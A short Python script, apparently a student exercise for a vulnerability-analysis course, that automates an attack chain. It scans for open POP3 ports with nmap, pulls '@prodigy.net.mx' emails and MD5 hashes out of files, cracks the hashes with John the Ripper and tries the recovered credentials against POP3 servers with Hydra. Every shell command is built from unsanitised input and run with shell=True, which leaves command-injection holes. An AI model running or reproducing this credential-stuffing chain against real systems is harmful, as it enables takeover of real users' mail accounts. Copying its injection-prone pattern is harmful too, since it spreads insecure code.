#!/usr/bin/env python
'''
Jonathan Perez Guzman
Analisis de vulnerabilidades II
Escaneo Prodigy
Python version = 3.10
'''
import sys, os
import subprocess as sp
import re


os.system('clear')
print("Escaneo Prodigy")
option_menu = input("1.- Escanear red \n2.- Obtener correo y hashes de archivo\n3.- Crackear Hashes\n4.- Buscar vulnerabilidades con Hydra\n")
clear_screen = sp.call(["clear"], shell = True)

match option_menu:
    case "1":
        scan_ip = input("Introduce la direccion IP a escanear: ")
        text_file_name = re.sub("(\-)|(/)", "_", scan_ip)
        cmd = (f'nmap -p 110 {scan_ip} --open -Pn -oG - | grep "/open" | awk \'{{print $2}}\' > {text_file_name}_resultados.txt')
        scan_ip_result = sp.call([cmd], shell = True)
        clear_screen = sp.call(["clear"], shell = True)
        print(f"{text_file_name}_resultados.txt creado en {os.getcwd()}")

    case "2":
        file_l = input("Nombre del archivo para extraer email:hash: ")
        file_s = re.sub("(\.)", "_", file_l)
        cmd = f"cat {file_l} | grep -i '@prodigy.net.mx' | sed s/\\'//g | sed s/,/:/g "
        regex = "| grep -oe '[a-zA-Z0-9._]\+@[a-zA-Z]\+.[a-zA-Z.]\+:[a-f0-9]\{32\}'"
        save_results = f" > {file_s}_mail_hash.txt"
        resultado = sp.call([cmd + regex + save_results], shell = True)
        print(f"{file_s}_mail_hash.txt creado en {os.getcwd()}")

    case "3":
        clear_screen = sp.call(["clear"], shell = True)
        file_pass = input("Nombre del archivo a crackear con JtR: ")
        jtr_option = input("Usar diccionario?\n1.- Si\n2.- No(--single)\n")
        clear_screen = sp.call(["clear"], shell = True)
        match jtr_option:
            case "1":
                dictionary = input("Nombre del diccionario a utilizar: ")
                jtr_dic = f"john --wordlist={dictionary} --format=Raw-MD5 {file_pass}"
                save_pass_cmd = sp.call([jtr_dic], shell = True)
                save_pass = f"john --show --format=Raw-MD5 {file_pass} > aux_{file_pass}"
                save_pass_cmd = sp.call([save_pass], shell = True)
                with open(f"aux_{file_pass}", "r") as F:
                    lines = F.readlines()
                with open(f"cracked_{file_pass}", "w") as F2:
                    F2.writelines(lines[:-2])
                print(f"Resultado cracked_{file_pass} creado en {os.getcwd()}")
            case "2":
                jtr_single = f"john --single --format=Raw-MD5 {file_pass}"
                save_pass_cmd = sp.call([jtr_single], shell = True)
                save_pass = f"john --show --format=Raw-MD5 {file_pass} > aux_{file_pass}"
                save_pass_cmd = sp.call([save_pass], shell = True)
                with open(f"aux_{file_pass}", "r") as F:
                    lines = F.readlines()
                with open(f"cracked_{file_pass}", "w") as F2:
                    F2.writelines(lines[:-2])
                print(f"Resultado cracked_{file_pass} creado en {os.getcwd()}")

    case "4":
        pass_file = input("Nombre del archivo con contrasenas: ")
        ip_arg = input("Introduzca IP a probar: ")
        hydra_param = f"hydra -C {pass_file} -V {ip_arg} pop3"
        hydra_attck = sp.call([hydra_param], shell = True)
